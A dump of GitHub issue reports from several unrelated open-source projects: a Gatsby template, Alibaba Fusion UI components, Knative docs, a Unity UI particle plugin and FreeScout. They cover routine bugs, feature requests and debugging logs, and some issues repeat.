const Test = ({ data }) => (
  <Layout>
    <Head pageTitle={data.testJson.title} />
    <Box>
      <div
        dangerouslySetInnerHTML={{
          __html: data.testJson.content.childMarkdownRemark.html,
        }}
      />
    </Box>
  </Layout>
);

Test.propTypes = {
  data: PropTypes.object.isRequired,
};

export default Test;

export const query = graphql`
  query TestQuery {
    testJson {
      title
      content {
        childMarkdownRemark {
          html
        }
      }
    }
  }
`;
```

Just copy of about page, renamed all about things to test.

created test folder with test.json and content.md under /content folder, just copy of about (markdown file is just a line of text though).

I got the following error when I save the project:
```
Unknown field 'testJson' on type 'Query'. Source: document `TestQuery` file: `GraphQL request`
```

Obviously it's related with this part it looks:
```
export const query = graphql`
  query TestQuery {
    testJson {
      title
      content {
        childMarkdownRemark {
          html
        }
      }
    }
  }
`;
```

As I remember from the gatsby tutorial in gatsby's website, the queries are created using gatsby-node.js file, but it looks it's just a boilerplate in this template. Just trying to understand where aboutJson query is defined, so I can define testJson accordingly but no joy so far. Can you please explain, how can I add a new page using this template?

Cheers,
<---------->
138132664
### Component 
Checkbox

### Reproduction link 
[https://codepen.io/devrsi0n/pen/BaBPvzo?&editable=true&editors=0010](https://codepen.io/devrsi0n/pen/BaBPvzo?&editable=true&editors=0010)

### Steps to reproduce
Checkbox 取消选中的同时 disabled， checkbox 会导致样式多了蓝色的 border，查看样式主要是多了 focus 类名。（链接里面点2次 checkbox 即可复现）

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Checkbox --> * [ ] I have searched the [issues](https://github.com/alibaba-fusion/next/issues) of this repository and believe that this is not a duplicate.

<img width="523" alt="图片" src="https://user-images.githubusercontent.com/49219209/55458240-ffac4b80-561e-11e9-94a8-20673364624a.png">

## Component
form

## Feature Description
对于一些组件，例如DatePicker、Switch等，无法实现标签与输入框进行关联，也就是labe的for不起作用。需要使用label的id属性和aria-labelledby进行关联。

## Reproduction link
https://riddle.alibaba-inc.com/riddles/ec7e654e

## Steps to reproduce
开启屏幕阅读器，使用tab键聚焦到`DatePicker`，`Switch`组件上，无法读取label



 - [ ] I have searched the [issues](https://github.com/alibaba-fusion/next/issues) of this repository and believe that this is not a duplicate.

<img width="523" alt="图片" src="https://user-images.githubusercontent.com/49219209/55458240-ffac4b80-561e-11e9-94a8-20673364624a.png">

## Component
form

## Feature Description
对于一些组件，例如DatePicker、Switch等，无法实现标签与输入框进行关联，也就是labe的for不起作用。需要使用label的id属性和aria-labelledby进行关联。

## Reproduction link
https://riddle.alibaba-inc.com/riddles/ec7e654e

## Steps to reproduce
开启屏幕阅读器，使用tab键聚焦到`DatePicker`，`Switch`组件上，无法读取label





<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Form --> ### Component 
Upload



### Steps to reproduce
![image](https://dailyfusion.oss-cn-hangzhou.aliyuncs.com/images/lHkUPUDvoqbS.png)

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Upload --> - [ ] I have searched the [issues](https://github.com/alibaba-fusion/next/issues) of this repository and believe that this is not a duplicate.

### Version
1.14.2

### Component
Table

### Environment
Chrome浏览器Version 74.0.3729.131 (Official Build) (64-bit)

### Reproduction link
[https://fusion.design/component/basic/table](https://fusion.design/component/basic/table)

### Steps to reproduce
@alife/next-table 版本 1.1.3
开启锁列功能，在表格里滚动
      

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Table --> - [ ] https://github.com/alibaba/ice/issues/1588
- [ ] https://github.com/alibaba/ice/issues/1539
- [ ] https://github.com/alibaba/ice/issues/1486
- [ ] https://github.com/alibaba/ice/issues/1451
- [ ] https://github.com/alibaba/ice/issues/1451
- [ ] https://github.com/alibaba/ice/issues/1208
- [ ] https://github.com/alibaba/ice/issues/1160
- [ ] https://github.com/alibaba/ice/issues/1125
- [ ] https://github.com/alibaba/ice/issues/1054
- [ ] https://github.com/alibaba/ice/issues/1046
- [ ] https://github.com/alibaba/ice/issues/1033
- [ ] https://github.com/alibaba/ice/issues/1025
- [ ] https://github.com/alibaba/ice/issues/1019
- [ ] https://github.com/alibaba/ice/issues/1004
- [ ] https://github.com/alibaba/ice/issues/1001
- [ ] https://github.com/alibaba/ice/issues/941
- [ ] https://github.com/alibaba/ice/issues/874
- [ ] https://github.com/alibaba/ice/issues/860
- [ ] https://github.com/alibaba/ice/issues/520 ### Component 
Table
### Feature Description
希望可以有一个 andt Table 可以合并表头的Table功能

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Table --> ### Component 
NumberPicker



### Steps to reproduce

![image](https://fusion-image.oss-cn-beijing.aliyuncs.com/images/Ki7DUZZAJ3Bn.png)
组件引入就是这个样式

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: NumberPicker --> ### Component 
NumberPicker



### Steps to reproduce

![image](https://fusion-image.oss-cn-beijing.aliyuncs.com/images/Ki7DUZZAJ3Bn.png)
组件引入就是这个样式

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: NumberPicker --> ### Component 
DatePicker
### Feature Description
目前的RangePicker在选择的时候只能选择日期到日期，即使修改了format=“YYYY-MM”，也是选择日期，只是展示为月份而已，体验不佳

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: DatePicker --> ### Component 
Dialog



### Steps to reproduce
偶现， 部分windows 机型会出现

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Dialog --> ### Component 
DatePicker
### Feature Description
目前的RangePicker在选择的时候只能选择日期到日期，即使修改了format=“YYYY-MM”，也是选择日期，只是展示为月份而已，体验不佳

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: DatePicker --> ### Component 
Slider



### Steps to reproduce
focus 样式需要慎重使用
![image](https://fusion-image.oss-cn-beijing.aliyuncs.com/images/MY7UG5IuvpcI.png)

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Slider --> ### Component 
TreeSelect

### Reproduction link 
[https://fusion.design/component/basic/tree-select#%E5%8F%97%E6%8E%A7](https://fusion.design/component/basic/tree-select#%E5%8F%97%E6%8E%A7)

### Steps to reproduce
1. 访问官方文档 https://fusion.design/component/basic/tree-select#%E5%8F%97%E6%8E%A7 中的【受控】示例
2. 点击【Display】的 x 号

期望：
能移除该结点

实际：
无法移除。下拉展开，取消选择 display，然后重新选择后，才能点击 x 号来关闭

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: TreeSelect --> ### Component 
Tab
### Feature Description
![](https://img.alicdn.com/tfs/TB14xDkjbr1gK0jSZR0XXbP8XXa-846-609.gif)

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Tab --> component
Table
<img width="1008" alt="6770EA8E-0929-43BC-B736-CCD48128D368" src="https://user-images.githubusercontent.com/16032393/69786122-bbe10480-11f4-11ea-8dea-661b6b2e8015.png">

[https://codepen.io/hehuilin/pen/zYYgEOr?&editable=true&editors=0010](url)

 ### Component 
Balloon

### Reproduction link 
https://riddle.alibaba-inc.com/riddles/ce6642db

### Steps to reproduce
Tooltip在alignEdge时的布局表现与Balloon

![image](https://user-images.githubusercontent.com/10049465/66842201-6d0d4180-ef9d-11e9-92a7-94bb8077b39c.png)
![image](https://user-images.githubusercontent.com/10049465/66842245-7eeee480-ef9d-11e9-87c8-3c209f6bb51a.png)




<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Balloon --> ### Component 
Icon
### Feature Description
有几个在中后台系统中非常通用的icon需要再基础库里面补充下：
![image](https://user-images.githubusercontent.com/10049465/64678425-1eefb480-d4ac-11e9-9c84-7a4d459fb13a.png)

copy 复制       
lock 锁  
exit 退出 
chart  图表 
toggle 展开


### 工作量：
1. 基础库 next 新增icon
2. 默认iconfont 地址修改
3. 配置平台 订正数据（用户自定义的icon可能会同名）
<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Icon --> ### Component 
Collapse

### Reproduction link 
[https://riddle.alibaba-inc.com/riddles/a737420a](https://riddle.alibaba-inc.com/riddles/a737420a)

### Steps to reproduce

![image](https://fusion-image.oss-cn-beijing.aliyuncs.com/images/dJS3nqJC7DYU.png)

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Collapse --> ### Component 
Table

### Reproduction link 
[https://riddle.alibaba-inc.com/riddles/6b69cb7b](https://riddle.alibaba-inc.com/riddles/6b69cb7b)

### Steps to reproduce
https://riddle.alibaba-inc.com/riddles/6b69cb7b

<!-- generated by alibaba-fusion-issue-helper. DO NOT REMOVE -->
<!-- component: Table -->
<---------->
138207223
Going forward, knative.dev should only mention breaking or important changes from one previous version (v.latest -1). 

Todo:
- [ ] All references to any other version should be removed
- [ ] Revise all content to consider only one version prior
- [ ] If we must mention something, consider adding it to a migration guide or known issues page

Example:
The line about "v0.3" should be removed and revised:
https://knative.dev/docs/install/knative-custom-install/#installing-knative
 <!-- For a feature request about a change to Knative, please open the issue in the corresponding repo. -->

**Describe the change you'd like to see**
After PR https://github.com/knative/serving/pull/5186 is checked in, we need a document to introduce how to set up cluster to use HTTP01 challenge for Auto TLS.


 - [ ] Knative Install on Azure Kubernetes Service
- [ ] Knative Install on Gardener
- [ ] Knative Install on Google Kubernetes Engine
- [ ] Knative Install on IBM Cloud Kubernetes Service
- [ ] Knative Install on IBM Cloud Private
- [ ] Knative Install on Pivotal Container Service
- [ ] Knative Install on any Kubernetes
- [ ] Knative Install on Docker for Mac
- [ ] Knative Install on Minikube
- [ ] Knative Install on Minishift
- [ ] Knative Install on OpenShift
- [ ] Perfoming a Custom Knative Installation Eventing Sources has removed `gcr.io/knative-releases/github.com/knative/eventing-sources/cmd/message_dumper`

The new image to use to view events:   `gcr.io/knative-releases/github.com/knative/eventing-sources/cmd/event_display` `spec.traffic` block of a ksvc supports a `tag` field (new-ish feature).

But I can't seem to find what this field does and how it can be used to split traffic.

Ideally it would be mentioned here https://knative.dev/docs/serving/samples/traffic-splitting/index.html

It's actually used here: https://knative.dev/v0.8-docs/serving/samples/blue-green-deployment/ but it doesn't explain what the "tag" field is for and what it does. <!-- If you're reporting a bug with Knative itself, open the bug in the corresponding repo. IE., https://github.com/knative/serving for an issue with serving. -->
<!-- If you need to report a security issue with Knative, send an email to knative-security@googlegroups.com. -->
## Expected Behavior

knative 'serving page' image link is broken.


## Actual Behavior


## Steps to Reproduce the Problem

1.
1.
1.

## Additional Info
**Additional context**
Add any other context about the problem here.

**Install information:**
 - Platform (GKE, IKS, AKS, etc.):
 - Knative Version:
 <!-- If you're reporting a bug with Knative itself, open the bug in the corresponding repo. IE., https://github.com/knative/serving for an issue with serving. -->
<!-- If you need to report a security issue with Knative, send an email to knative-security@googlegroups.com. -->

## Expected Behavior
Example here https://github.com/knative/docs/blob/master/docs/serving/configuring-the-autoscaler.md#configuring-cpu-based-autoscaling should put the parameter in side annotations

## Actual Behavior
No annotations is set, the creation using example fails

## Steps to Reproduce the Problem

1.
1.
1.

## Additional Info
**Additional context**
Add any other context about the problem here.

**Install information:**
 - Platform (GKE, IKS, AKS, etc.):
 - Knative Version:
 Determine how to accomplish this in the site and then implement one of the following options:

* Create/host a peer "archives" site that gets refreshed at each release 
    - Send version 'latest-2' to archive when new version is published to knative.dev.
    - Create and publish another site on Netlify (ie. archives.knative.dev)
    - The archive site would a separate build process

* Static content is copied at build time. 
    - Remove archived content from the builds.
    - Content is built once and then copied into a static folder
    - Continue to be published in the same knative.dev site
    - Requires manual updates and publishing (so far nobody has wanted or tried to update past releases) 

Note: Both options require some tweaking to Menus (including how the right nav bar GitHub links are generated). Page: https://knative.dev/docs/eventing/getting-started/

This claims it installs "eventing sources" but actually this installs the entire Eventing release and NO "eventing sources".

> ![image](https://user-images.githubusercontent.com/159209/70271217-cfdbb780-175a-11ea-8ab4-b8961451e514.png)

AFAICT eventing sources install isn't documented. These pages showing up on site search results for keyword "private"  seem to be gone and redirect to the homepage :( (why can't we set up redirect while shuffling files like this in Netlify?)

There's nothing under `Serving Component` on the sidebar that helps me find where this content has gone to.

![image](https://user-images.githubusercontent.com/159209/70275105-4cbe5f80-1762-11ea-9889-653d1af66446.png)
 found at  https://knative.dev/docs/eventing/getting-started/#installing-knative-eventing

> ![image](https://user-images.githubusercontent.com/159209/70276244-b2abe680-1764-11ea-8e41-044d4eedef1c.png)
 Page: https://knative.dev/docs/install/installing-istio/#installing-istio-with- sidecar-injection
and
https://knative.dev/docs/install/installing-istio/#installing-istio-without-sidecar-injection

Specifically the highlighted part `install/kubernetes/helm/istio`.

![image](https://user-images.githubusercontent.com/159209/71142232-a0519400-21cb-11ea-9ef3-920a8e549a41.png)

I'm not sure how it's supposed to work. That's a file path reference but docs don't explain where to find that file. (I assume istio/istio repo needs to be cloned first, but it's not mentioned in the page).

Furthermore `kubectl create namespace istio-system` is required before kubectl apply. It's not mentioned. Code blocks in https://knative.dev/docs/serving/accessing-traces/ page have trailing new line

![image](https://user-images.githubusercontent.com/159209/71143226-a301b880-21ce-11ea-841d-65066ee5ae61.png)
 This page renders considerably worse than the version that shows on GitHub. We should figure out how we can tweak the markdown to be more consumable on the website.

https://knative.dev/docs/eventing/sources/

 **Describe the change you'd like to see**
Add a new 'Install Knative using `kn`' section to https://knative.dev/docs/install/ <!-- If you're reporting a bug with Knative itself, open the bug in the corresponding repo. IE., https://github.com/knative/serving for an issue with serving. -->
<!-- If you need to report a security issue with Knative, send an email to knative-security@googlegroups.com. -->
## Expected Behavior
The container kube-rbac-proxy in pods node-exporter can be running.

## Actual Behavior
```
kubectl get pod -n knative-monitoring |grep 'node-exporter'
node-exporter-6m9ch                   1/2     CrashLoopBackOff   186        17h
node-exporter-blbmg                   1/2     CrashLoopBackOff   175        17h
node-exporter-dkl5x                   1/2     CrashLoopBackOff   181        17h
node-exporter-gdb2x                   1/2     CrashLoopBackOff   179        17h
node-exporter-xpctr                   2/2     Running            184        17h
```

## Steps to Reproduce the Problem

1. I already have a Kubernetes(v1.13) cluster.
2. Installing Istio with sidecar injection.
3. Installing Knative.

## Additional Info
**Additional context**
Add any other context about the problem here.
log for container kube-rbac-proxy
```
F1205 02:00:38.732346 1184015 main.go:197] Failed to listen on secure address: listen tcp :9100: bind: address already in use
goroutine 1 [running]:
github.com/brancz/kube-rbac-proxy/vendor/github.com/golang/glog.stacks(0xc42000fc00, 0xc4204ec000, 0x7e, 0xb2)
	/go/src/github.com/brancz/kube-rbac-proxy/vendor/github.com/golang/glog/glog.go:766 +0xcf
github.com/brancz/kube-rbac-proxy/vendor/github.com/golang/glog.(*loggingT).output(0x1826bc0, 0xc400000003, 0xc420022370, 0x179cd86, 0x7, 0xc5, 0x0)
	/go/src/github.com/brancz/kube-rbac-proxy/vendor/github.com/golang/glog/glog.go:717 +0x30f
github.com/brancz/kube-rbac-proxy/vendor/github.com/golang/glog.(*loggingT).printf(0x1826bc0, 0x3, 0x10a9d76, 0x26, 0xc420491d38, 0x1, 0x1)
	/go/src/github.com/brancz/kube-rbac-proxy/vendor/github.com/golang/glog/glog.go:655 +0x14b
github.com/brancz/kube-rbac-proxy/vendor/github.com/golang/glog.Fatalf(0x10a9d76, 0x26, 0xc420491d38, 0x1, 0x1)
	/go/src/github.com/brancz/kube-rbac-proxy/vendor/github.com/golang/glog/glog.go:1145 +0x67
main.main()
	/go/src/github.com/brancz/kube-rbac-proxy/main.go:197 +0xf63
```
**Install information:**
 - Platform (GKE, IKS, AKS, etc.):
I already have a Kubernetes(v1.13) cluster.
 - Knative Version:
0.9 https://knative.dev/docs/install/installing-istio/

This page has some serious flaws.

Most notably anyone reading the page top to bottom will install FULL istio, then LEAN istio, but nowhere in titles it says it's a LEAN istio.

![image](https://user-images.githubusercontent.com/159209/71144028-78652f00-21d1-11ea-867a-d17c9a0b498a.png)

Hope this helps. Generate new version of the 0.5 API reference docs

* Obtain commit numbers to build API for each Knative component
* Use instructions here https://github.com/knative/docs/tree/master/docs/reference ## Expected Behavior
https://knative.dev/docs/eventing/samples/gcp-pubsub-source/ is easy to follow

## Actual Behavior
Install instructions for Knative are unclear. It's also not clear when you are done with the install portion.

## Additional context

Screenshots from Slack discussion w/ Jonathan Campos: https://drive.google.com/file/d/1ceAyeFiQRyYougY5PTy8NrOI6B63nNQ0/view

https://drive.google.com/file/d/149DtUDgx9din0Ys2fS9aD-grjaMiqoFe/view

(Must be a member of knative-users to view: https://groups.google.com/forum/#!forum/knative-users )

 <!-- If you're reporting a bug with Knative itself, open the bug in the corresponding repo. IE., https://github.com/knative/serving for an issue with serving. -->
<!-- If you need to report a security issue with Knative, send an email to knative-security@googlegroups.com. -->
## Expected Behavior

Kafka in the list of code samples:
https://knative.dev/docs/eventing/samples/
(it should be https://github.com/knative/docs/tree/master/docs/eventing/samples/kafka )


## Actual Behavior

Missing link to
https://github.com/knative/docs/tree/master/docs/eventing/samples/kafka

## Steps to Reproduce the Problem

1. Open https://knative.dev/docs/eventing/samples/


## Additional Info
**Additional context**
Add any other context about the problem here.

Kafka docs were merged 
https://github.com/knative/docs/pull/1712

**Install information:**
 - Platform (GKE, IKS, AKS, etc.):
 - Knative Version:

<---------->
138290022
Particle not use shape, mode is billboard.
I Rotate the rect to (90, 0 , 0), some paticle the render will no work.

i try this to solve：
if (0 < m_ParticleSystem.particleCount)
  {
   ....
    _mesh.SetVertices(s_Vertices);
   //Recalculate the bounds
   _mesh.RecalculateBounds();
   ....
 } I was wondering, I want to use ParticleEffectForUGI for screens transaction, but since my screen contains also UI elements (As children), the effect won't include the UI elements, but just the image the effect is within.

I know you plan to release a feature that does that, meanwhile, is there a workaround you know?

by the way, this is a great asset!  Hello,

I have an issue when I try to change the position of the UI particles in script (to move them towards a RectTransform target).

Basically, here is what I do:
`particles[i].position = Vector3.LerpUnclamped(particles[i].position, target.position, step);`
(I tried with Vector3.MoveTowards and the issue is the same)

I have the same problem in Local space and World space.

The position where the particles go seem to depend on the ParticleSystem position (I can see that easily when I move the emitter while the particles are moving).

I use Unity 2018.4.1f1 and v2.3.0 of ParticleEffectForUGUI.

Do you think the issue can come from this plugin? Or am I doing something wrong?
 Particle not use shape, mode is billboard.
I Rotate the rect to (90, 0 , 0), some paticle the render will no work.

i try this to solve：
if (0 < m_ParticleSystem.particleCount)
  {
   ....
    _mesh.SetVertices(s_Vertices);
   //Recalculate the bounds
   _mesh.RecalculateBounds();
   ....
 } Hello there,

I'm having an issue. I basically have an inventory with around 30 slots. Each slot has two particles. All the particles are not playing on awake and only called to be played or stopped via script. 

Example: Player drag and drop an item in one of these slots: particles play and don't loop.

I've been very careful for any kind of particles system to be completely stopped. So if I open the inventory nothing is playing at all and only certain actions will play 1 particle system at a time.

Example of one slot: 
![UI_Particles_Perf_2](https://user-images.githubusercontent.com/39954105/70559326-ba192880-1b86-11ea-8a74-cb7876878e90.jpg)

My UI has some scripts that I need to access even when the UI is not shown. So I don't disable the UI but hide it with a canvas group.

When Disabling the Inventory UI game object that has the slots with particles I have around 350 fps (for reference)
When the Inventory is enabled on screen or not (canvas group) it drops to 160-200 fps.

The profiler shows a lot happening with UIEvents.WillRenderCanvases every frames

![UI_Particles_Perf](https://user-images.githubusercontent.com/39954105/70559083-5abb1880-1b86-11ea-9b6e-a1086423836c.jpg)

Is there any solution that doesn't involve disabling the game objects to help with that issue?
 #### Steps to reproduce the issue

1.  Use Unity2019.1 and ParticleEffectForUGUI2.3.0
2.  Create a Canvas in Scene.
3.  Create a empty GameObject in Canvas.
4.  Add a ParticleSystem component.
5.  Add a UI-Particle component.
6.  Set the ParticleSystem.Shape to Edge.


#### How to fix it.

Scripts\Editor\UIParticleEditor.cs :602
`#if UNITY_2019_1_OR_NEWER`
        `float radius = Call<float> (typeof (Handles), "DoSimpleEdgeHandle", Quaternion.identity, Vector3.zero, shapeModule.radius, true);`
`#else`
        `float radius = Call<float> (typeof (Handles), "DoSimpleEdgeHandle", Quaternion.identity, Vector3.zero, shapeModule.radius);`
`#endif`

References
https://github.com/Unity-Technologies/UnityCsReference/blame/master/Editor/Mono/EditorHandles/SimpleRadiusHandle.cs#L12

Thank you. Hello there,

I'm having an issue. I basically have an inventory with around 30 slots. Each slot has two particles. All the particles are not playing on awake and only called to be played or stopped via script. 

Example: Player drag and drop an item in one of these slots: particles play and don't loop.

I've been very careful for any kind of particles system to be completely stopped. So if I open the inventory nothing is playing at all and only certain actions will play 1 particle system at a time.

Example of one slot: 
![UI_Particles_Perf_2](https://user-images.githubusercontent.com/39954105/70559326-ba192880-1b86-11ea-8a74-cb7876878e90.jpg)

My UI has some scripts that I need to access even when the UI is not shown. So I don't disable the UI but hide it with a canvas group.

When Disabling the Inventory UI game object that has the slots with particles I have around 350 fps (for reference)
When the Inventory is enabled on screen or not (canvas group) it drops to 160-200 fps.

The profiler shows a lot happening with UIEvents.WillRenderCanvases every frames

![UI_Particles_Perf](https://user-images.githubusercontent.com/39954105/70559083-5abb1880-1b86-11ea-9b6e-a1086423836c.jpg)

Is there any solution that doesn't involve disabling the game objects to help with that issue?
 our particle use the feature of custom Vertex Streams in particle then i find that it doesnt work, can you give me an idea of how to solve it? thanks how to make particle already emitted  not follow emit transform?
I try simulation space to world but is wont't work after add ui particle script our particle use the feature of custom Vertex Streams in particle then i find that it doesnt work, can you give me an idea of how to solve it? thanks Created a particle system in my canvas and attached UIParticle to it. The particles appear perfectly in scene view, but turn completely black in game view. Anyone else facing this too? Hello there,

I'm having an issue. I basically have an inventory with around 30 slots. Each slot has two particles. All the particles are not playing on awake and only called to be played or stopped via script. 

Example: Player drag and drop an item in one of these slots: particles play and don't loop.

I've been very careful for any kind of particles system to be completely stopped. So if I open the inventory nothing is playing at all and only certain actions will play 1 particle system at a time.

Example of one slot: 
![UI_Particles_Perf_2](https://user-images.githubusercontent.com/39954105/70559326-ba192880-1b86-11ea-8a74-cb7876878e90.jpg)

My UI has some scripts that I need to access even when the UI is not shown. So I don't disable the UI but hide it with a canvas group.

When Disabling the Inventory UI game object that has the slots with particles I have around 350 fps (for reference)
When the Inventory is enabled on screen or not (canvas group) it drops to 160-200 fps.

The profiler shows a lot happening with UIEvents.WillRenderCanvases every frames

![UI_Particles_Perf](https://user-images.githubusercontent.com/39954105/70559083-5abb1880-1b86-11ea-9b6e-a1086423836c.jpg)

Is there any solution that doesn't involve disabling the game objects to help with that issue?
 Particle not use shape, mode is billboard.
I Rotate the rect to (90, 0 , 0), some paticle the render will no work.

i try this to solve：
if (0 < m_ParticleSystem.particleCount)
  {
   ....
    _mesh.SetVertices(s_Vertices);
   //Recalculate the bounds
   _mesh.RecalculateBounds();
   ....
 } Hey, first of all this looks really promising so thanks for sharing it!
This is not an issue, iI would like to know if you did any performance test on devices (mobile perhaps) and see if it's to heavy or not.

Thanks again! When I try to play a particle system with trails I get this error:
![image](https://user-images.githubusercontent.com/8560641/70392877-6d95e780-19e4-11ea-8e5b-151f99d440b4.png)

It uses a combination of noise and velocity over lifetime to move the particle for which rendering is disabled. Only the trials should get rendered. I'm using a mobile particle material on this element for better performance. I'm fine with the particle not supporting masking.

I am editing the particle system inside a prefab.

![image](https://user-images.githubusercontent.com/8560641/70392868-6078f880-19e4-11ea-9943-13412f955620.png)
 In gamma space,there is no issue.
but when change color space from gamma to Linear.
The ParticleSystem with UIParticle become darker than it without UIParticle.

![image](https://user-images.githubusercontent.com/7671107/67396604-753b3180-f5da-11e9-8b99-ec7005c0654d.png)

same params:
![image](https://user-images.githubusercontent.com/7671107/67396828-d82cc880-f5da-11e9-8d95-687aeb9b2caf.png)


 Hello there,

I'm having an issue. I basically have an inventory with around 30 slots. Each slot has two particles. All the particles are not playing on awake and only called to be played or stopped via script. 

Example: Player drag and drop an item in one of these slots: particles play and don't loop.

I've been very careful for any kind of particles system to be completely stopped. So if I open the inventory nothing is playing at all and only certain actions will play 1 particle system at a time.

Example of one slot: 
![UI_Particles_Perf_2](https://user-images.githubusercontent.com/39954105/70559326-ba192880-1b86-11ea-8a74-cb7876878e90.jpg)

My UI has some scripts that I need to access even when the UI is not shown. So I don't disable the UI but hide it with a canvas group.

When Disabling the Inventory UI game object that has the slots with particles I have around 350 fps (for reference)
When the Inventory is enabled on screen or not (canvas group) it drops to 160-200 fps.

The profiler shows a lot happening with UIEvents.WillRenderCanvases every frames

![UI_Particles_Perf](https://user-images.githubusercontent.com/39954105/70559083-5abb1880-1b86-11ea-9b6e-a1086423836c.jpg)

Is there any solution that doesn't involve disabling the game objects to help with that issue?
 As the BakeMesh API changes the mesh of the canvasRenderer, the canvas contains the UIParticle component will rebuild every frame. 
My experiment: I compare 10000 ParticleSystems and 10000 UIParticles, the FPS are both about 10. But when I create 5000 other Texts and Images in the same canvas, the ParticleSystems remains 10 FPS, the UIParticles decreases to 2 FPS. The reason is the canvas will reorder the 20000+ elements and batch their meshes before rendering.
It seems if the UI is complicated, we need to create specific canvas for the UIParticles component to seperate with other components. It is working on editor smoothly but not quite sure how to use it in my builds. When I try this on Android, it crashed with this error log : 

```
10-04 01:26:02.381 22282 22304 E Unity   : NullReferenceException: Object reference not set to an instance of an object.
10-04 01:26:02.381 22282 22304 E Unity   :   at Coffee.UIExtensions.UIParticle.UpdateMesh () [0x00000] in <00000000000000000000000000000000>:0
10-04 01:26:02.381 22282 22304 E Unity   :   at Coffee.UIExtensions.UIParticle.UpdateMeshes () [0x00000] in <00000000000000000000000000000000>:0
10-04 01:26:02.381 22282 22304 E Unity   :   at UnityEngine.Canvas+WillRenderCanvases.Invoke () [0x00000] in <00000000000000000000000000000000>:0
10-04 01:26:02.381 22282 22304 E Unity   : Coffee.UIExtensions.UIParticle:UpdateMesh()
10-04 01:26:02.381 22282 22304 E Unity   : Coffee.UIExtensions.UIParticle:UpdateMeshes()
10-04 01:26:02.381 22282 22304 E Unity   : UnityEngine.WillRenderCanvases:Invoke()
10-04 01:26:02.381 22282 22304 E Unity   :
10-04 01:26:02.381 22282 22304 E Unity   : (Filename: currently not available on il2cpp Line: -1)
```

 I was wondering, I want to use ParticleEffectForUGI for screens transaction, but since my screen contains also UI elements (As children), the effect won't include the UI elements, but just the image the effect is within.

I know you plan to release a feature that does that, meanwhile, is there a workaround you know?

Great asset! 
<---------->
138328462
Somehome emails are stopped from being sent. It was working fine but not sure what happened suddenly and none of my emails are sending.

<img src="https://cldup.com/IeVGP_R82V.png" />

Any help will be highly appreciated.

-----
FreeScout Version: 1.1.6
PHP Version: 7.1.21
Web Server: Apache
MySQL Version: 14.14 Distrib 5.5.61 I was always looking for a way to delete all the threads from Deleted folder permanently _(just like Empty Trash feature)_. There is _no native functionality at the moment_ to do so, so I've created this workaround.

Run the following MySQL queries and it will get the job done.

> don't forget to update the mailbox_id value to it's respective one. You can find it from within url by visiting your Mailbox ( eg.: http://your-freescout-domain/mailbox/1. That means 1 is your mailbox_id )

----------
`DELETE FROM conversations WHERE folder_id = 6 AND mailbox_id = 1;`

`UPDATE folders SET total_count = 0, active_count = 0 WHERE id = 6 AND mailbox_id = 1;`

----------

> _Take a full backup of your database before you run the above queries._

I hope this will help someone looking to achieve the same. Appreciate if @freescout-helpdesk comment on the above. todo I reached out to Softaculous, a company that implements 1-click installations for shared hosting for majority of hosts in c-panel.

They tried to implement FreshDesk, but couldn't do to this:

 > Our developers just checked the details and concluded that freescout requires virtual host entry to install https://github.com/freescout-helpdesk/freescout/wiki/Installation-Guide#62-apache We have confirmed the same with vendor also on Github. Hence we shall not be able to add this at Softaculous.

Is there any way to re-configure the installation process so that less tech savvy people can deploy easily from their c-panel? That would be a big step towards adoption. Running version 1.1.2, today everything seemed to be working fine but all of a sudden FreeScout can no longer fetch emails, and outputs this error when it tries:

```
[2018-12-14 20:40:04] Mailbox: <Mailbox name>
[2018-12-14 20:40:04] Folder: INBOX
[2018-12-14 20:40:04] Error: Invalid mailbox list: <>; File: /var/www/freescout.git/app/Console/Commands/FetchEmails.php (150)
[2018-12-14 20:40:04] Fetching finished
```

It seems to have been caused by a failed delivery email in the Inbox, likely because either the `Return-path` or `To` header was set to `<>` (my guess). Here are the headers of that email:

```
Return-Path: <>
Delivered-To: support@website.com
Received: from mail.website.com ([127.0.0.1])
  by mail.website.com with LMTP id GDr1DfKAFFx5JAAAXRy+/A
  for <support@website.com>; Fri, 14 Dec 2018 20:20:02 -0800
Received: (Haraka 30047 invoked for bounce); Fri, 14 Dec 2018 20:20:02 -0800
Date: Fri, 14 Dec 2018 20:20:02 -0800
From: MAILER-DAEMON@mail.website.com
To: <>
Subject: failure notice
Message-Id: <E48DCDE2-0163-44BB-A451-29B3B9837C55@mail.website.com>
Content-Type: multipart/report; report-type=delivery-status;
    boundary="boundary_3D69C48A-D84E-4182-B200-681FC991DEC5"
References: <autoreply-106-f0935e4cd5920aa6c7c996a5ee53a70f@website.com>
DKIM-Signature: v=1;a=rsa-sha256;bh=GW35JtOWUDUuTCUQWpUc3MU3aqrouc42wzNIIWGVl3s=;c=relaxed/simple;d=turtlemailbox.com;h=from:subject:date:message-id:to;s=s20181123173;b=q6nUGzOrQIDILD3xyCWxP3ZdniUnvEX9BINZQ6sP6gdftkloYLeyLjy6Aq7yO+M2ngIigNP5P7snHTDCAePiGYrRXA2kbhkXvuI88z1j6JIhOBqKrcifWELeB5ppRusVtR0dvg5AkdrCiM8PNqYdLdFu81PfK2wx1E6nXOJMPIabEcAwbeNgvH/psrAcxne58eYAMCzvhBex9hSHm6xVIDSxO7qQSOvlXgNpmQRGqToNnxRA5Niwoh7UpCXy0UeH2Mmqz3JZHSQ+UG4ai9VpsB9MlbMgrpyS+GMK2utPAoeuqgVCfLmQpWcWXPkyEMqNjvNLk93xO5rGlN0SMgUutA==

